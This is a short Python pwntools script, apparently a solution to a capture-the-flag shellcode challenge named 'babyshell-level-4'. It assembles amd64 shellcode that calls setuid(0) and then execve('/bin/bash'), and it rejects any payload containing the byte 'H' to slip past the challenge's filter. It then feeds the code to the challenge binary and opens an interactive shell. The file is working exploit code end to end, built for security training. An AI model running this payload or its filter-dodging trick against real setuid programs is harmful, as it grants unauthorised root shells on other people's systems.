from pwn import *

def main() -> None:
    context.arch = 'amd64'
    code = asm('''
    mov eax, 105
    mov edi, 0
    syscall

    mov eax, 59
    lea edi, [rip + bash]
    xor esi, esi
    xor edx, edx
    syscall

    mov eax, 60
    syscall

    bash: .string "/bin/bash"
    ''')
    print(disasm(code, arch='amd64'))
    if (b'H' in code):
        print("Invalid shellcode")
        return

    p = process(["/challenge/babyshell-level-4"])
    p.send(code)
    p.interactive()

if __name__ == "__main__":
    main()
